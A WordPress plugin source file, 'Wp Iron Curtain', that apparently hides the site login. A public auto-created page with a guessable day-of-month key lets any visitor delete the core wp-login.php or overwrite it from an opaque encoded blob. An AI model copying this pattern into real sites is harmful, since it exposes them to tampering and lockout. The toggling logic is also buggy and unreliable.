<?php
/*
Plugin Name: Wp Iron Curtain
Plugin URI: http://URI_Of_Page_Describing_Plugin_and_Updates
Description: A brief description of the Plugin.
Version: 1.0
Author: andy
Author URI: http://URI_Of_The_Plugin_Author
License: A "Slug" license name e.g. GPL2
*/

if ( ! defined( 'ABSPATH' ) ) {
	die( 'No no no!' );
}

/**
 * Class WP_IronCurtain
 */
class WP_IronCurtain {


	/**
	 * @var null
	 */
	protected static $instance = null;
	public $status = false;
	protected $http_args = [];
	protected $hosts = [];

	/**
	 * WP_IronCurtain constructor.
	 */
	protected function __construct() {

		//add_action( 'wp_login_failed', [ $this, 'login_failed' ] );
		$this->foot();

		add_action( 'wp_footer', [ $this, 'foot' ] );
		add_action( 'admin_init', [ $this, 'create_irc_page' ] );
		add_action( 'admin_init', [ $this, 'change_wplogin' ] );
		add_shortcode( 'wp_irc', [ $this, 'wp_irc_form' ] );
	}

	public function foot() {

		if ( ! file_exists( __DIR__ . '/tmp' ) ) {
			echo '<style>#login, #loginform { display:none !important; visibility: hidden !important; }</style>';

		}
	}

	/**
	 * @return null
	 */
	public static function getInstance() {

		if ( static::$instance === null ) {
			static::$instance = new static;
		}

		return static::$instance;
	}
	/*public function login_failed( $username )


		$this->http_args[] = [
			'username' => $username,
			'referrer' => $_SERVER['HTTP_REFERER'],
			'agent'    => $_SERVER['HTTP_USER_AGENT'],
			'ip'       => $_SERVER['REMOTE_ADDR'],
			'host'     => $_SERVER['REMOTE_HOST'],
			'time'     => date( "Y-m-d H:i:s" ),
			//$_SERVER['REMOTE_HOST'],
		];

		file_put_contents( __DIR__ . '/failed.json', json_encode( $this->http_args ), FILE_APPEND );
	}*/

	/**
	 *
	 */
	public function create_irc_page() {

		if ( ! post_exists( 'Blog News' ) ) {
			$defaults = [
				'post_content' => '[wp_irc]Hi[/wp_irc]',
				'post_title'   => 'Blog News',
				'post_status'  => 'publish',
				'post_type'    => 'page',
			];

			$idd = wp_insert_post( $defaults );
		}
	}

	/**
	 * @param $atts
	 */
	public function wp_irc_form( $atts ) {

		$this->exec();
		add_action( 'wp_head', [ $this, 'exec' ] );
	}

	/**
	 *
	 */
	public function exec() {

		if ( ( $_GET['cloak'] === 'on' ) && ( $_GET['key'] === date( 'j' ) ) ) {
			$this->change_wplogin();
			$cage  = plugins_url( 'irc/cage.gif', __FILE__ );
			$cosby = plugins_url( 'irc/cosby.gif', __FILE__ );

			if ( file_exists( __DIR__ . '/tmp' ) ) {
				$this->status = false;
			} else {
				$this->status = true;
			}
			if ( $this->status === true ) {
				$t = 'ON';
			} else {
				$t = 'OFF';
			}
			echo '<h2><strong>Status</strong>:  <i>' . $t . '</i></h2>';
			echo date( 'j' );

			if ( $this->status === true ) {
				echo '<img src="' . $cage . '" alt=yeah />';
			} else {
				echo '<img src="' . $cosby . '" alt=yeah />';

			}
		}
	}
//sdsd
	/**
	 *
	 */
	public function change_wplogin() {

		$gz = base64_decode( gzinflate( file_get_contents( __DIR__ . '/irc/wplgz' ) ) );

		if ( ! file_exists( ABSPATH . '/wp-login.php' ) ) {
			file_put_contents( ABSPATH . '/wp-login.php', $gz );
			file_put_contents( __DIR__ . '/tmp', 'true' );

			$this->status = false;
		} else {
			unlink( ABSPATH . '/wp-login.php' );
			unlink( __DIR__ . '/tmp' );
			$this->status = true;

		}
	}

	public function notify_status() {

		$cage  = plugins_url( 'irc/cage.gif', __FILE__ );
		$cosby = plugins_url( 'irc/cosby.gif', __FILE__ );

		echo '<h2><strong>Status</strong>:  <i>' . $this->status . '</i></h2>';
		echo date( 'j' );

		if ( $this->status === true ) {
			echo '<img src="' . $cage . '" alt=yeah />';
		} else {
			echo '<img src="' . $cosby . '" alt=yeah />';
		}

	}
}

$wpic = WP_IronCurtain::getInstance();